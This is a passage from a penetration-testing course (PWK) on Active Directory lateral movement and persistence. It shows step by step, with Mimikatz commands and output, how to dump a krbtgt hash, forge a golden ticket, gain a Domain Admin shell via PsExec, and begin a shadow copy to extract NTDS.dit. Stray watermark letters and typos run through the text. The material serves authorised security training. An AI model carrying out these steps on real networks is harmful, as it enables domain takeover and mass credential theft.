Listing 856 - Obtaining a reverse-shell through DCOM lateral movement
Excellent! We gained a foothold on an additional internal box by abusing the DCOM MMC
application.
In this Learning Unit, we learned the theory behind a number of lateral movement attacks and
how to execute them from compromised clients.
1160 (Microsoft, 2022), https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 795
Made in Morocco
Penetration Testing with Kali Linux
Next, we’ll discover how to maintain access on the target network through persistence
techniques.
23.2 Active Directory Persistence
This Learning Unit covers the following Learning Objectives:
• Understand the general purpose of persistence techniques
• Leverage golden tickets as a persistence attack
• Learn about shadow copies and how can they be abused for persistence
Once an adversary has obtained access to a single or multiple hosts, they would like to maintain
access to extend the operation time span. This means that the attacker’s access to the target
network has to carry on after a reboot or even a credential change. MyITRE defines the persistence
tactic1161 as a set of techniques aimed to maintain an attacker’s foothold on the target network.
k
We can use traditional persistence methods in an Active Directory environment, but we can also
gain AD-specific persistence as well. Note that in many real-world penetration tests or red-team
engagements, persistence is not part of the scope due tso the risk of incomplete removal once the
assessment is complete.
o
In the next Learning Unit, we are going to explore how golden ticket and shadow copy techniques
can be misused to retain access.
n
23.2.1 Golden Ticket
Returning to the explanation of Kerbieros authentication, we’ll recall that when a user submits a
request for a TGT, the KDC encrzypts the TGT with a secret key known only to the KDCs in the
domain. This secret key is actually the password hash of a domain user account called krbtgt.1162
D
If we are able to get our hands on the krbtgt password hash, we could create our own self-made
custom TGTs, also known as golden tickets.1163
Although this technique’s name resembles the Silver Ticket one that we encountered in the
Attacking Authentication Module, Golden Tickets provide a more powerful attack vector. While
Silver Tickets aim to forge a TGS ticket to access a specific service, Golden Tickets give us
permission to access the entire domain’s resources, as we’ll see shortly.
For example, we could create a TGT stating that a non-privileged user is actually a member of the
Domain Admins group, and the domain controller will trust it because it is correctly encrypted.
1161 (MITRE, 2022), https://attack.mitre.org/tactics/TA0003/
1162 (Microsoft, 2016), https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-
2012/dn745899(v=ws.11)#Sec_KRBTGT
1163 (A.Duckwall, B.Delpy, 2014), https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-
You-Guys-Don%27t-Get-It.pdf
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 796
Made in Morocco
Penetration Testing with Kali Linux
We must carefully protect stolen krbtgt password hashes because they grant
unlimited domain access. Consider explicitly obtaining the client’s permission
before executing this technique.
This provides a neat way of keeping persistence in an Active Directory environment, but the best
advantage is that the krbtgt account password is not automatically changed.
In fact, this password is only changed when the domain functional level is upgraded from a pre-
2008 Windows server, but not from a newer version. Because of this, it is not uncommon to find
very old krbtgt password hashes.
y
The Domain Functional Level1164 dictates the capabilities of the domain and
k
determines which Windows operating systems can be run on the domain
controller. Higher functional levels enable additional features, functionality, and
s
security mitigations.
o
To test this persistence technique, we will first attempt to laterally move from the Windows 11
CLIENT74 workstation to the domain conntroller via PsExec as the jen user by spawning a
traditional command shell with the cmd command. This should fail because we do not have the
proper permissions.
i
C:\Tools\SysinternalsSuite>PsEzxec64.exe \\DC1 cmd.exe
PsExec v2.4 - Execute processes remotely
D
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com
Couldn't access DC1:
Access is denied.
Listing 857 - Failed attempt to perform lateral movement
At this stage of the engagement, the golden ticket will require us to have access to a Domain
Admin’s group account or to have compromised the domain controller itself in order to work as a
persistence method.
With this kind of access, we can extract the password hash of the krbtgt account with Mimikatz.
To simulate this, we’ll log in to the domain controller via remote desktop using the jeffadmin
account, run Mimikatz from C:\Tools, and issue the lsadump::lsa command1165 as displayed
below:
mimikatz # privilege::debug
Privilege '20' OK
1164 (Microsoft, 2017), https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels
1165 (Benjamin Delphy, 2016), https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 797
Made in Morocco
Penetration Testing with Kali Linux
mimikatz # lsadump::lsa /patch
Domain : CORP / S-1-5-21-1987370270-658905905-1781884369
RID : 000001f4 (500)
User : Administrator
LM :
NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e
RID : 000001f5 (501)
User : Guest
LM :
NTLM :
RID : 000001f6 (502)
User : krbtgt y
LM :
NTLM : 1693c6cefafffc7af11ef34d1c788f47
... k
Listing 858 - Dumping the krbtgt password hash using Mimikatz
s
Having obtained the NTLM hash of the krbtgt account, along with the domain SID, we can now
forge and inject our golden ticket.
o
Creating the golden ticket and injecting it into memory does not require any administrative
privileges and can even be performed from a computer that is not joined to the domain. We’ll take
the hash and continue the procedure from an compromised workstation.
Back on CLIENT74 as the jen user, before generating the golden ticket, we’ll launch mimikatz and
i
delete any existing Kerberos tickets with kerberos::purge.
z
We’ll supply the domain SID (which we can gather with whoami /user) to the Mimikatz
kerberos::golden1166 command to create the golden ticket. This time, we’ll use the /krbtgt option
D
instead of /rc4 to indicate we are supplying the password hash of the krbtgt user account.
Starting July 2022,1167 we’ll need to provide an existing account, so let’s set the golden ticket’s
username to jen.
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-
658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
User : jen
Domain : corp.com (CORP)
SID : S-1-5-21-1987370270-658905905-1781884369
User Id : 500
Groups Id : *513 512 520 518 519
ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
Lifetime : 9/16/2022 2:15:57 AM ; 9/13/2032 2:15:57 AM ; 9/13/2032 2:15:57 AM
-> Ticket : ** Pass The Ticket **
1166 (Benjamin Delphy, 2016), https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos
1167 (Microsoft, 2022), https://support.microsoft.com/en-gb/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-
e0d0-4cb8-959a-143bd0201041
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 798
Made in Morocco
Penetration Testing with Kali Linux
* PAC generated
* PAC signed
* EncTicketPart generated
* EncTicketPart encrypted
* KrbCred generated
Golden ticket for 'jen @ corp.com' successfully submitted for current session
mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF665F1B800
Listing 859 - Creating a golden ticket using Mimikatz
Mimikatz provides two sets of default values when using the golden ticket option: the user ID and
the groups ID. The user ID is set to 500 by default, which is the RID of the built-in administrator for
the domain, while the values for the groups ID consist of the mosyt privileged groups in Active
Directory, including the Domain Admins group.
k
With the golden ticket injected into memory, we’ve launched a new command prompt with
misc::cmd from which we again attempt lateral movement with PsExec.
s
C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe
o
PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com
n
C:\Windows\system32>ipconfig
i
z
Windows IP Configuration
D
Ethernet adapter Ethernet0:
Connection-specific DNS Suffix . :
Link-local IPv6 Address . . . . . : fe80::5cd4:aacd:705a:3289%14
IPv4 Address. . . . . . . . . . . : 192.168.50.70
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 192.168.50.254
C:\Windows\system32>whoami
corp\jen
C:\Windows\system32>whoami /groups
GROUP INFORMATION
-----------------
Group Name Type SID
Attributes
=========================================== ================
============================================
===============================================================
Everyone Well-known group S-1-1-0
Mandatory group, Enabled by default, Enabled group
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 799
Made in Morocco
Penetration Testing with Kali Linux
BUILTIN\Administrators Alias S-1-5-32-544
Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users Alias S-1-5-32-545
Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554
Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK Well-known group S-1-5-2
Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11
Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization Well-known group S-1-5-15
Mandatory group, Enabled by default, Enabled group
CORP\Domain Admins Group S-1-5-21-1987370270-
658905905-1781884369-512 Mandatory group, Enabled by default, Enabled group
CORP\Group Policy Creator Owners Group S-1-5-21-1987370270-
658905905-1781884369-520 Mandatory group, Enabled by default,y Enabled group
CORP\Schema Admins Group S-1-5-21-1987370270-
658905905-1781884369-518 Mandatory group, Enabled by default, Enabled group
CORP\Enterprise Admins Group k S-1-5-21-1987370270-
658905905-1781884369-519 Mandatory group, Enabled by default, Enabled group
CORP\Denied RODC Password Replication Group Alias S-1-5-21-1987370270-
s
658905905-1781884369-572 Mandatory group, Enabled by default, Enabled group, Local
Group
Mandatory Label\High Mandatory Level Loabel S-1-16-12288
Listing 860 - Performing lateral movement and persistence using the golden ticket and PsExec
We have an interactive command prompt non the domain controller and notice that the whoami
command reports us to be the user jen, which is now part of the Domain Admin group. Listing
group memberships shows that we are now a member of multiple powerful groups including the
i
Domain Admins group. Excellent.
z
Note that by creating our own TGT and then using PsExec, we are performing the overpass the
hash attack by leveraging Kerberos authentication as we discussed earlier in this Module. If we
D
were to connect PsExec to the IP address of the domain controller instead of the hostname, we
would instead force the use of NTLM authentication and access would still be blocked as the next
listing shows.
C:\Tools\SysinternalsSuite> psexec.exe \\192.168.50.70 cmd.exe
PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com
Couldn't access 192.168.50.70:
Access is denied.
Listing 861 - Use of NTLM authentication blocks our access
In this section, we have demonstrated the golden ticket technique as a persistence mechanism.
By obtaining the NTLM hash of the krbtgt user, we can issue domain-administrative TGTs to any
existing low-privileged account and thus, obtain inconspicuous legitimate access to the entire AD
domain.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 800
Made in Morocco
Penetration Testing with Kali Linux
23.2.2 Shadow Copies
A Shadow Copy,1168 also known as Volume Shadow Service (VSS) is a Microsoft backup
technology that allows creation of snapshots of files or entire volumes.
To manage volume shadow copies, the Microsoft signed binary vshadow.exe1169 is offered as part
of the Windows SDK.1170
As domain admins, we have the ability to abuse the vshadow utility to create a Shadow Copy that
will allow us to extract the Active Directory Database NTDS.dit database file.1171 Once we’ve
obtained a copy of said database, we can extract every user credential offline on our local Kali
machine.
To start off, we’ll connect as the jeffadmin domain admin user to the DC1 domain controller and
launch from an elevated prompt the vshadow utility with -nw options to disable writers,1172 which
y
speeds up backup creation and include the -p option to store the copy on disk.
C:\Tools>vshadow.exe -nw -p C: k
VSHADOW.EXE 3.0 - Volume Shadow Copy sample client.
s
Copyright (C) 2005 Microsoft Corporation. All rights reserved.
o
(Option: No-writers option detected)
(Option: Create shadow copy set)
- Setting the VSS context to: 0x0000001n0
Creating shadow set {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...
- Adding volume \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\] to the shadow
set... i
Creating the shadow (DoSnapshoztSet) ...
(Waiting for the asynchronous operation to finish...)
Shadow copy set succesfully created.
D
List of created shadow copies:
Querying all shadow copies with the SnapshotSetID {f7f6d8dd-a555-477b-8be6-
c9bd2eafb0c5} ...
* SNAPSHOT ID = {c37217ab-e1c4-4245-9dfe-c81078180ae5} ...
- Shadow copy Set: {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5}
- Original count of shadow copies = 1
- Original Volume name: \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\]
- Creation Time: 9/19/2022 4:31:51 AM
- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
- Originating machine: DC1.corp.com
- Service machine: DC1.corp.com
1168 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Shadow_Copy
1169 (Microsoft, 2022), https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample
1170 (Microsoft, 2022), https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/
1171 (Microsoft, 2017), https://technet.microsoft.com/en-us/library/cc961761.aspx
1172 (Microsoft, 2022), https://learn.microsoft.com/en-us/windows/win32/vss/shadow-copy-creation-details
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 801
Made in Morocco
Penetration Testing with Kali Linux
- Not Exposed
- Provider id: {b5946137-7b9f-4925-af80-51abd60b20d5}
- Attributes: Auto_Release No_Writers Differential
Snapshot creation done.
Listing 862 - Permorming a Shadow Copy of the entire C: drive
Once the snapshot has been taken successfully, we should take note of the shadow copy device
name.